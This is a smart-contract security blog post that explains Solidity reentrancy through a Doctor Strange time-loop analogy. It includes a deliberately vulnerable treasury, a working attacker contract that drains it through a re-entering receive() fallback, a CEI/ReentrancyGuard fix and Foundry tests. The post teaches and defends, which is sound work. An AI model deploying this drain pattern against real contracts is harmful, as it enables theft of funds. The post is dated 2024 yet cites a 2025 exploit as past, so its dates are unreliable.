---
title: "Doctor Strange vs Dormammu - Reentrancy Exploit in Solidity (CEI Case Study)."
published: 2024-09-03
description: "Doctor Strange traps Dormammu in a time loop to explain Solidity’s reentrancy exploit. Learn how reentrancy works, how attackers drain treasuries, and how CEI + ReentrancyGuard fix it."
image: /Reetrancy-CEI.jpg
tags: [Solidity, Smart Contracts, Security, Reentrancy, MCU]
category: Audit-Case-Study
draft: false
---

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Article",
  "headline": "Doctor Strange vs Dormammu - Reentrancy Exploit in Solidity (CEI Case Study)",
  "description": "Doctor Strange traps Dormammu in a time loop to explain Solidity’s reentrancy exploit. Learn how reentrancy works, how attackers drain treasuries, and how CEI + ReentrancyGuard fix it.",
  "image": "https://multiv-rekt.vercel.app/Reetrancy-CEI.jpg",
  "author": {
    "@type": "Person",
    "name": "The Sandf"
  },
  "datePublished": "2024-09-03",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://multiv-rekt.vercel.app/posts/reentrancy-cei/"
  }
}
</script>

# 🌀 Doctor Strange vs Dormammu - Reentrancy Exploit Case Study

## TL;DR

* **Vulnerability:** Reentrancy in `withdraw()` (external call before state update).
* **Impact:** An attacker (Doctor Strange, via the Time Stone)  can reenter via fallback and drain the **Dormammu Treasury**.
* **Severity:** High
* **Fix:** Apply CEI (update state before external calls) and use a reentrancy guard.

---

## 🎬 Story Time

In *Doctor Strange (2016)*, Strange traps Dormammu in an infinite **time loop**. Just like Strange looping Dormammu until surrender, the `receive()` loop forces the treasury into repeated withdrawals until drained.

In smart contract security:

* **Dormammu** = “timeless treasury” → vulnerable to reentrancy (powerful but careless).
* **Doctor Strange** = doesn’t attack directly → he uses the Time Stone.
* **Time Stone (contract)** = has the receive() fallback and does the recursive withdraw() calls (the infinite loop).

This mirrors the movie: Strange wins not by force, but by infinite repetition - just like a reentrancy attack.

---

## Roles

* **DormammuTreasuryVulnerable** → the treasury (victim). 
* **TimeStone** → the attack contract (the magical exploit engine).
* **DoctorStrange (EOA / test)** → just a caller who wields the TimeStone.

::github{repo="thesandf/Void-Rekt"}

## 📌 Vulnerable Contract

Here’s the `DormammuTreasuryVulnerable.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
  Dormammu (the treasury) holds Ether for citizens and pays a reward on withdraw.
  Bug: withdraw() sends Ether before updating the user's balance (CEI violation).
  An attacker (Doctor Strange) can reenter withdraw() in their fallback and drain the contract.
*/

contract DormammuTreasuryVulnerable {
    mapping(address => uint256) public balanceOf;

    /// @notice Alien Citizens deposit to the Dormammu Treasury
    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        balanceOf[msg.sender] += msg.value;
    }

    /// @notice Withdraw available balance (vulnerable)
    function withdraw() external {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "no balance");

        //  Vulnerable: external call happens BEFORE state update
        (bool sent,) = payable(msg.sender).call{value: amount}("");
        require(sent, "send failed");

        // state update happens after the external call - attacker can reenter here
        balanceOf[msg.sender] = 0;
    }

    /// @notice Current treasury balance
    function treasuryBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```
>[!WARNING]
External call happens **before** state reset. If the recipient is a contract with a `receive()` or `fallback()`, it can call `withdraw()` again before its balance is cleared.

---

##  Proof of Exploit

Attacker = **TimeStone.sol**:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {DormammuTreasuryVulnerable} from "../../src/Reentrancy-CEI/DormammuTreasuryVulnerable.sol";

/// @title Doctor Strange attacker (reentrancy) & Attacker + test harness using TimeStone.
contract TimeStone {
    DormammuTreasuryVulnerable public treasury;
    address public owner;
    uint256 public rewardAmount;

    constructor(address _vuln) {
        treasury = DormammuTreasuryVulnerable(_vuln);
        owner = msg.sender;
    }

    /// @notice deposit and start the attack
    function attack() external payable {
        require(msg.sender == owner, "You're not a Doctor Strange");
        require(msg.value > 0, "send ETH to attack");
        // deposit small amount to be eligible for withdraw
        treasury.deposit{value: msg.value}();
        // set single-call baseline reward to attempt
        rewardAmount = msg.value;
        treasury.withdraw();
    }

    /// @notice fallback - reenter while the treasury still has funds
    receive() external payable {
        // while the treasury still has at least `rewardAmount`, reenter withdraw()
        // careful: this condition keeps reentering until the treasury is drained or < rewardAmount
        if (address(treasury).balance >= rewardAmount) {
            treasury.withdraw();
        }
    }

    /// @notice collect stolen funds to owner externally (for test reporting)
    function collect() external {
        require(msg.sender == owner, "You're not a Doctor Strange");
        payable(owner).transfer(address(this).balance);
    }
}
```


### 🌀 The Attack Flow (Vulnerable)

1.  **Strange Deposits:** Doctor Strange deposits 1 ETH into the vulnerable treasury.
2.  **Strange Withdraws:** Strange calls the `withdraw()` function on the treasury contract.
3.  **Treasury Sends Ether:** The treasury sends the 1 ETH to Strange's contract **before** updating his balance to zero.
4.  **Re-entry:** Strange's contract has a `receive()` fallback that is triggered by the incoming ETH. This fallback immediately calls the `withdraw()` function again.
5.  **Infinite Loop:** Since Strange's balance was never reset, the treasury sends another 1 ETH. This loop continues until the treasury is empty.

![Reentrancy Exploit Flow](/Reetrancy-CEI.svg)


---

##  Fixed Contract

`DormammuTreasuryFixed.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract DormammuTreasuryFixed is ReentrancyGuard {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "no balance");

        //  Effects first
        balanceOf[msg.sender] = 0;

        //  Then interaction
        (bool sent, ) = payable(msg.sender).call{value: amount}("");
        require(sent, "send failed");
    }

    function treasuryBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

**Fixes applied:**

* CEI (update balance before transfer).
* `nonReentrant` modifier for extra guard.

---

##  Foundry Test (Exploit Reproduction)

`test/ExploitDormammu.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {DormammuTreasuryVulnerable} from "../../src/Reentrancy-CEI/DormammuTreasuryVulnerable.sol";
import {DormammuTreasuryFixed} from "../../src/Reentrancy-CEI/DormammuTreasuryFixed.sol";
import {TimeStone} from "../../src/Reentrancy-CEI/TimeStone.sol";

contract ReentrancyDormammuTest is Test {
    DormammuTreasuryVulnerable treasury;
    DormammuTreasuryFixed fixedTreasury;
    TimeStone stone;
    TimeStone timeStoneFixed;

    address public Doctor_Strange = makeAddr("Doctor Strange");

    function setUp() public {
        // Deploy vulnerable and fixed contracts
        treasury = new DormammuTreasuryVulnerable();
        fixedTreasury = new DormammuTreasuryFixed();

        // Fund the Dormammu treasury (other citizens)
        vm.deal(address(this), 50 ether);
        // send 20 ETH to vulnerable treasury as "Alien citizen deposits"
        treasury.deposit{value: 20 ether}();
        fixedTreasury.deposit{value: 20 ether}();

        // deploy stone and fund it
        vm.prank(Doctor_Strange);
        stone = new TimeStone(address(treasury));
        vm.deal(address(Doctor_Strange), 5 ether);

        vm.prank(Doctor_Strange);
        timeStoneFixed = new TimeStone(address(fixedTreasury));
    }

    function test_Strange_Drains_Dormammu_With_TimeStone() public {
        // Check initial balances
        uint256 initialTreasury = address(treasury).balance;
        assertEq(initialTreasury, 20 ether);

        // Doctor Strange: Doctor Strange deposits 1 ETH and triggers reentrancy withdraw
        vm.prank(Doctor_Strange);
        stone.attack{value: 1 ether}();

        // After attack collect to track funds in This Contract (optional)
        vm.prank(Doctor_Strange);
        stone.collect();

        // Doctor Strange (via Time Stone) gains more than his initial 1 ETH
        // Dormammu Treasury should NOT have its full 20 ETH anymore
        uint256 remainingTreasury = address(treasury).balance;
        assertLt(remainingTreasury, 20 ether, "Dormammu Treasury should have lost funds due to reentrancy");
    }

    /// @notice Minimal test reusing vulnerable pattern but targeting fixed contract type
    function test_Fixed_Resists_Reentrancy() public {
        // Check initial balances
        uint256 initialTreasury = address(fixedTreasury).balance;
        assertEq(initialTreasury, 20 ether);

        // Doctor Strange tries to attack fixed treasury
        vm.prank(Doctor_Strange);
        vm.expectRevert(); // we EXPECT this to fail
        timeStoneFixed.attack{value: 1 ether}();

        // Verify treasury still holds full funds
        uint256 remainingfixedTreasury = address(fixedTreasury).balance;
        assertEq(remainingfixedTreasury, 20 ether, "Fixed treasury should resist reentrancy and keep full funds");
    }
}
```
In `test_Fixed_Resists_Reentrancy()`,
why we expect revert:
The reason the test for the fixed contract expects a revert is that the **`nonReentrant`** modifier on the `withdraw` function works exactly as it should.

1.  The attacker's contract calls `withdraw()` for the first time. The `nonReentrant` modifier locks the function.
2.  The attacker's fallback function is triggered and tries to call `withdraw()` again.
3.  The `nonReentrant` modifier sees the function is still locked and immediately **reverts the entire transaction**.

---

##  Auditor’s Checklist

* [ ] External calls before state updates.
* [ ] Missing `nonReentrant`.
* [ ] Loops with external calls.
* [ ] No attacker simulation in tests.

---

##  Recommendations

* Always apply **Checks → Effects → Interactions**.
* Use `nonReentrant` modifiers.
* Consider **pull-payment patterns**.
* Test with attacker contracts in CI pipelines.

---

## References & Inspiration

* MCU: *Doctor Strange (2016)* → loop analogy.
* Historical hacks: 
#### 1. **GMX-\$40M Reentrancy Exploit (November 4, 2025)**

* **Loss:** Approximately **\$40 million**
* **Details:** The exploit stemmed from a reentrancy vulnerability in `executeDecreaseOrder()`. The function accepted **smart contract addresses** (instead of EOAs), enabling attackers to inject arbitrary reentry logic during callbacks.[Medium](https://blog.blockmagnates.com/40m-gmx-reentrancy-exploit-leads-week-of-smart-contract-failures-87086153ee78)
* **Relevance to CEI:** External interactions were allowed **before proper state updates or input validation**, violating CEI principles. It underscores that even complex logic like order execution must respect CEI.

#### 2. **Penpie (Pendle) - \$27M Exploit (September 3, 2024)**

* **Loss:** Around **\$27 million** stolen
* **Details:** Attackers deployed fake yield-bearing tokens (SY), created malicious pools, and triggered reentrancy to drain rewards. Successfully siphoned **\$15.7M** in one transaction, followed by two more that took **\$5.6M** each.[CryptoSlate](https://cryptoslate.com/penpie-exploited-for-27-million-in-reentrancy-attack/)
* **CEI Breakdown:** The exploit shows how reentrancy can be combined with token manipulation-even fake tokens can be used to violate interaction and balance update order.
* OpenZeppelin’s [ReentrancyGuard](https://docs.openzeppelin.com/contracts/5.x/api/utils#ReentrancyGuard).

---

## How to Run Locally

```bash
# install Foundry
curl -L https://foundry.paradigm.xyz | bash
foundryup

# clone repo & test
forge test -vv
```

---

> [!NOTE]
This repo is an **educational minimal reproduction** of reentrancy. The MCU analogy (Doctor Strange looping Dormammu) makes the bug memorable, but the exploit reflects **real-world \$150M+ hacks**.


::github{repo="thesandf/Void-Rekt"}

---
